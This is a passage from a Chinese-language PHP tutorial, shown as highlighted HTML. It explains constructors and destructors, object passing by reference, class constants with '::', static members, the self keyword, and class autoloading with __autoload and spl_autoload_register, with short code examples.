<span class="keyword">$this</span>-&gt;count = <span class="variable">$count</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="variable">$money</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler(<span class="number">100</span>,<span class="number">100</span>);<span class="comment"># 系统在new Saler(100,100)好之后，会自动调用一次</span></span><br><span class="line"><span class="variable">$s</span>-&gt;__construct(<span class="number">1000</span>,<span class="number">1000</span>);<span class="comment"># 允许手动调用</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、构造方法__construct()是一种系统内置的方法，该方法的特性是会在对象实例化之后，对象立即自动调用</p><p>2、构造方法的目的就是为了初始化资源，包含对象属性和其他资源</p><p>3、一旦构造方法定义好之后，且构造方法自带参数，那么就只能使用<code>new 类名(参数列表)</code>方式才能正确实例化</p><p>4、构造方法可以当做普通方法由对象调用（不建议）</p><h3 id="8、析构方法"><a href="#8、析构方法" class="headerlink" title="8、析构方法"></a><strong>8、析构方法</strong></h3><blockquote><p>目标：了解析构方法的作用，能够实际应用析构方法</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>析构方法</strong>：__destruct()，也是一种类结构中魔术方法，与构造方法一样，也是系统规定好，只需要开发人员<strong>抄</strong>一遍即可，对象在被销毁时会自动调用</p><ul><li>析构方法是用来对象销毁时主动释放资源的</li><li>对象销毁<ul><li>对象无变量指向（变量指向其他数据）</li><li>对象被主动销毁（unset销毁对象变量）</li><li>脚本执行结束（自动释放资源）</li></ul></li><li>PHP脚本执行结束会释放所有资源，所以一般较少使用析构方法</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、确定需要在对象销毁时释放资源</p><p>3、使用析构方法释放资源</p><blockquote><p>示例</p></blockquote><p>1、析构方法实现：类中增加一个__destruct()方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 析构方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、析构方法调用：析构方法是在对象被销毁时自动，对象的“垂死挣扎”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化对象</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对象变量指向其他数据</span></span><br><span class="line"><span class="variable">$s</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主动销毁对象变量</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本执行结束自动释放</span></span><br></pre></td></tr></table></figure><p>3、析构方法也是普通方法，可以由对象直接调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接析构方法实现代码</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;__destruct();<span class="comment"># 思考：此时对象是否被销毁？</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、析构方法是一种对象销毁时自动调用的方法</p><p>2、析构方法是用来对象销毁自身所占用的资源</p><p>3、PHP中脚本执行结束，系统会自动回收所有资源，因此一般PHP中很少使用析构方法</p><h3 id="9、对象传值"><a href="#9、对象传值" class="headerlink" title="9、对象传值"></a><strong>9、对象传值</strong></h3><blockquote><p>目标：了解PHP中对象传值的方式</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>对象传值</strong>：将保存对象的变量赋值给另外一个变量</p><ul><li>在PHP中，对象的传值是<strong>引用传递</strong>的：即一个对象变量赋值给另外一个变量，两个变量指向同一个对象的内存地址，即只有一个对象。</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、实例化产生对象，保存在变量中</p><p>3、将保存对象的变量赋值给另外一个变量</p><blockquote><p>示例</p></blockquote><p>1、对象传值就是保存对象的变量赋值给另外一个变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s2</span> = <span class="variable">$s1</span>;</span><br></pre></td></tr></table></figure><p>2、对象传值是引用传递，不管对象赋值给多少个变量，内存中只有一个对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 证明</span></span><br><span class="line">var_dump(<span class="variable">$s1</span>,<span class="variable">$s2</span>);<span class="comment"># 同一个对象</span></span><br><span class="line"><span class="variable">$s1</span>-&gt;name = <span class="string">&#x27;Saler&#x27;</span>;<span class="comment"># 更改一个变量所保存对象的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s2</span>-&gt;name;<span class="comment"># 输出Saler</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、对象传值方式是<strong>引用传值</strong>，不论对象如何被赋值给其他变量，始终只有一个对象</p><h3 id="10、范围解析操作符（类常量访问）"><a href="#10、范围解析操作符（类常量访问）" class="headerlink" title="10、范围解析操作符（类常量访问）"></a><strong>10、范围解析操作符（类常量访问）</strong></h3><blockquote><p>目标：理解范围解析操作符的概念和目标，掌握范围解析操作符的应用</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>范围解析操作符</strong>：由两个冒号组成“**::<strong>”，是专门用于</strong>类实现类成员操作**的，可以实现类直接访问类成员</p><ul><li>范围解析操作符是用于给类（类名）访问类成员使用的</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类名::类成员</span><br></pre></td></tr></table></figure><ul><li>范围解析操作符也可以被对象用来当做类使用（不建议使用）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$对象名::类成员</span><br></pre></td></tr></table></figure><ul><li>类常量只能被类访问</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、确定成员需要由类进行管理：类常量</p><p>3、在需要访问类常量的时候使用范围解析操作符访问</p><blockquote><p>示例</p></blockquote><p>1、类常量的普通访问尝试：尝试使用对象进行访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line"><span class="comment"># 类常量</span></span><br><span class="line">    <span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s1</span>-&gt;PI;<span class="comment"># 错误，$s1-&gt;PI最终转换的访问方式为:$PI，这个在类中并不存在</span></span><br></pre></td></tr></table></figure><p>2、以上案例可以看出，对象无法访问类常量，那是因为类常量的定义本身就是用来给类访问的，对象是用来访问属性和方法的，类常量的访问方式为：类名::常量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 类+范围解析操作符访问类常量</span></span><br><span class="line"><span class="keyword">echo</span> Saler::PI;<span class="comment"># 输出3.14</span></span><br></pre></td></tr></table></figure><p>3、对象本身也依赖于类，因此也可以使用对象对类控制成员进行访问，需要使用范围解析操作符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>::PI;<span class="comment"># 输出3.14</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：以上方式能访问，但是不建议使用（以上方式也能看出，成员谁来访问，关键看用什么符号：①使用范围解析操作符<code>::</code>就是类访问；②使用对象操作符号<code>-&gt;</code>就是对象访问）</p><p>4、分析：类常量是固定的，而对象的属性是不同对象而不同的，成员方法简单的理解也是为属性本身进行加工的。因此有一些东西是专属于类的，而有部分内容是专门为对象提供的，所以就会有不同的成员拥有不同的访问方式</p><blockquote><p><strong>小结</strong></p></blockquote><p>1、类访问成员的方式是使用范围解析操作符“**::**”访问，由类名直接访问：类名::类常量</p><p>2、类本身是通过对同类对象的抽象而形成，所以属性和方法本身都是由对象来访问</p><p>3、类也需要有一些自身的数据和操作，这些就由类来进行访问</p><h3 id="11、静态成员"><a href="#11、静态成员" class="headerlink" title="11、静态成员"></a><strong>11、静态成员</strong></h3><blockquote><p>目标：理解静态成员的概念，掌握静态成员的性质以及访问方式</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>静态成员</strong>：使用static关键字修饰的类成员，表示该成员属于类访问</p><ul><li>PHP静态成员有两种<ul><li>静态属性</li><li>静态方法</li></ul></li><li>静态成员是明确用来给类访问的，而不是对象</li><li>静态成员只是多了一个static关键字修饰，本身也可以被对象访问</li><li>静态成员同样可以使用不同访问修饰限定符限定，效果一致</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、确定有些成员（属性、方法）不需要对象访问，直接通过类访问</p><p>3、使用static关键字修饰</p><p>4、静态成员应该让类进行访问</p><blockquote><p>示例</p></blockquote><p>1、静态属性：在类中定义属性的时候使用static关键字修饰，访问的时候只能使用类+范围解析操作符+静态属性访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line"><span class="comment"># 属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$money</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;<span class="comment"># 静态属性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态成员可以直接使用类访问，而不需要先实例化对象</span></span><br><span class="line"><span class="keyword">echo</span> Saler::<span class="variable">$count</span>;</span><br></pre></td></tr></table></figure><p>2、静态方法：在类中定义方法的时候使用static关键字修饰，访问的时候使用类+范围解析操作符+静态方法名字()访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line"><span class="comment"># 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 类直接访问</span></span><br><span class="line">Saler::showClass();</span><br></pre></td></tr></table></figure><p>3、在类的内部也可以访问静态成员，同样是使用类名+范围解析操作符+静态属性/静态方法()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment"># 属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;<span class="comment"># 私有，不允许外部直接访问</span></span><br><span class="line"><span class="comment"># 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> Saler::<span class="variable">$count</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 类直接访问</span></span><br><span class="line">Saler::showClass();</span><br></pre></td></tr></table></figure><p>4、静态方法本质也是类中定义的方法，因此也可以使用对象进行访问，但是<strong>不建议</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对象访问静态方法</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;showClass();<span class="comment"># 输出0</span></span><br></pre></td></tr></table></figure><p>5、同理，方法也是在类内部，在编译时就存在，因此可以通过类来进行访问，使用范围解析操作符，但是<strong>非常不建议</strong>（会报错：因为类只允许访问静态成员和类常量）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testStatic</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 类访问普通成员方法</span></span><br><span class="line">Saler::testStatic();<span class="comment"># 输出testStatic，但是报错，当前访问的不是静态方法</span></span><br></pre></td></tr></table></figure><p>6、静态方法本质是给类访问，所以不允许在静态方法内部使用$this对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">testStaticThis</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>);<span class="comment"># 致命错误：$this放到了不该放的位置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、为了保障类能直接访问数据和操作数据，可以在属性和方法前增加static关键字变成静态属性和静态方法</p><p>2、类通过类名+范围解析操作符+静态成员的方式进行访问</p><p>3、静态成员也受访问修饰限定符的限定，访问权限与普通属性和方法的限制一样</p><p>4、对象可以无条件访问静态方法，而类只能访问不带$this的普通方法（不建议）</p><p>5、静态成员是给类访问的，非静态成员是给对象访问的</p><ul><li>静态属性和方法（静态和非静态）都是保存在类结构中（代码段）</li><li>普通属性保存在对象生成的对象空间里（堆）</li></ul><p>6、静态成员的访问效率比非静态成员高，因此有种说法是能用静态的时候就不用非静态（对象的特点是多元化，而静态的特点是单一化）</p><h3 id="12、self关键字"><a href="#12、self关键字" class="headerlink" title="12、self关键字"></a><strong>12、self关键字</strong></h3><blockquote><p>目标：了解self关键字的作用和应用场景</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>self关键字</strong>：在<strong>类的内部</strong>（方法里面）使用，代替类名的写法</p><ul><li><p>self如同$this代表内部对象一样，能够在方法内部代替当前类名</p></li><li><p>能够保障用户方便修改类名字</p></li><li><p>self关键字是代替类名，所以需要配合范围解析操作符<code>::</code></p></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、方法内部需要使用类名来进行成员访问（类常量、静态成员）</p><p>3、使用self关键字代替类名</p><blockquote><p>示例</p></blockquote><p>1、self是用来代替类名的，与范围解析操作符<code>::</code>一起使用的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment"># 静态属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;<span class="comment"># 私有，不允许外部直接访问</span></span><br><span class="line"><span class="comment"># 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> Saler::<span class="variable">$count</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="variable">$count</span>;<span class="comment"># 代替类名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、self也可以在类的内部方便实例化对象：比如构造方法被私有化之后，就没有办法在类外部实例化对象，此时可以在类内部进行对象实例化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment"># 属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;<span class="comment"># 私有，不允许外部直接访问</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment"># 私有，不允许外部实例化（因为对象不能外部调用）</span></span><br><span class="line"><span class="comment"># 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Saler();<span class="comment"># 使用类名实例化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">self</span>();<span class="comment"># 使用self关键字实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = Saler::getInstance();</span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、self是一种在类内部用来代替类名的关键字</p><p>2、self可以用来在类内部访问静态成员</p><p>3、self也可以在类内部用来实例化对象</p><p>4、帮助类名修改时，不用修改任何类的内部结构</p><h3 id="13、类的加载"><a href="#13、类的加载" class="headerlink" title="13、类的加载"></a><strong>13、类的加载</strong></h3><blockquote><p>目标：理解类的使用机制，掌握类的加载方式和原理</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>类的加载</strong>：类的访问必须保证类在内存中已经存在，所以需要在用类之前将类所在的PHP文件加载到内存</p><ul><li><p>类的加载分为两种</p><ul><li>手动加载：在需要使用类之间通过include将包含类的文件引入到内存</li><li>自动加载：提前定义好类结构和位置，<strong>写好引入类文件代码</strong>，在系统需要类而内存不存在的时候想办法让写好的加载类的代码执行（自动加载是自动运行写好的加载类的代码）</li></ul></li><li><p>真实开发中因为类文件很多，所以通常都会使用自动加载来节省开发工作量</p></li><li><p>自动加载有两种方式都可以实现</p><ul><li>魔术函数__autoload()：系统自动调用，需要传入类名，在函数内部实现类的手动加载</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment"># 找到对应的文件路径和命名规范，手动加载</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>自定义函数：自己定义类的加载实现，然后通过spl_autoload_register注册到自动加载机制（可以注册多个自动加载）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义类加载函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> 自定义函数(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment"># 找到对应的文件路径和命名规范，手动加载</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册自动加载</span></span><br><span class="line">spl_autoload_register(<span class="string">&#x27;自定义函数名字&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>自动加载要求在声明类的时候有良好的规范</p><ul><li>类名与文件名一致：类名.php（现在较多使用）或者类名.class.php</li><li>类文件分类放好</li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类文件</p><ul><li>类文件是独立文件，除了类之外不包含其他代码</li><li>类文件通常是一个类一个文件</li></ul><p>2、确定加载类型，写好加载代码</p><ul><li><p>手动加载：主动在调用前手动加载即可</p></li><li><p>自动加载__autoload()：实现好自动加载函数，在使用类之前声明好</p></li><li><p>自动加载spl_autoload_register()：自定义加载函数，在使用类之前通过spl注册</p></li></ul><p>3、在明确类能够通过自己写的加载代码加载时，可以直接使用类</p><ul><li>能找到：实现类的加载和使用</li><li>找不到：报错类无法找到</li></ul><blockquote><p>示例</p></blockquote><p>1、手动加载：即要访问某个类之前，使用文件包含将类所在的文件加载进来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 类文件：Saler.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">应用文件：useSaler.php</span><br><span class="line"><span class="comment"># 使用Saler类需要先包含Saler类所在的文件</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;Saler.php&#x27;</span>;<span class="comment"># 通常使用include_once，因为类不允许重名</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br></pre></td></tr></table></figure><p>2、加载类文件是一种比较消耗资源的方式，所以有的时候不确定类是否在内存中存在，可以事先使用class_exists()函数来判定是否存在，存在就不用加载，不存在才加载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Saler类，但是不确定内存中是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!class_exists(<span class="string">&#x27;Saler&#x27;</span>))&#123;</span><br><span class="line"><span class="comment"># 不存在：加载</span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;Saler.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br></pre></td></tr></table></figure><p>3、自动加载：PHP没有那么智能的系统自动加载，所谓自动加载只是PHP提供了一种<code>加载机制</code>：即实现定义一个函数__autoload()，然后当系统需要使用类，而内存中又不存在的时候，系统就会自动调用__autoload()函数来加载类文件.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自动加载机制：利用系统提供的__autoload()函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;<span class="comment"># 参数为类名：即当前需要访问的类的名字</span></span><br><span class="line"><span class="comment"># 需要人为定义去哪加载，怎么加载   </span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;<span class="comment"># 假定为当前目录下，类文件名字为：类名.php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用类：内存目前并没有</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();<span class="comment"># 系统发现内存没有Saler，所以调用__autoload()去加载</span></span><br></pre></td></tr></table></figure><p>4、一个系统里，可能类文件会放到不同的路径下，因此一个完整的自动加载函数，应该要进行文件判定以及加载功能</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义自动加载</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line"><span class="comment"># 组织文件路径：假设当前路径下，有两个文件夹下都有类c和m</span></span><br><span class="line">    <span class="variable">$c_file</span> = <span class="string">&#x27;c/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;<span class="comment"># 如c/Saler.php</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$c_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$c_file</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 说明c文件夹没有对应的文件</span></span><br><span class="line">    <span class="variable">$m_file</span> = <span class="string">&#x27;m/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;<span class="comment"># 如m/Saler.php</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$m_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$m_file</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：自动加载是指按照开发者规定的路径去寻找对应的文件，并实现包含。如果文件不存在，那么系统会在使用类的时候报错，因为这是开发者自己犯的错，系统不能规避。</p><p>5、随着PHP版本的提升，在7以后，不怎么建议直接使用__autoload()函数，而是采用一种注册机制，将用户自定义的函数，放到系统内部，使用spl_autoload_register(定义好的函数)。本质与__autoload()一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个函数，用来加载类文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;<span class="comment"># 也需要一个参数来接收要加载的类名字</span></span><br><span class="line">    <span 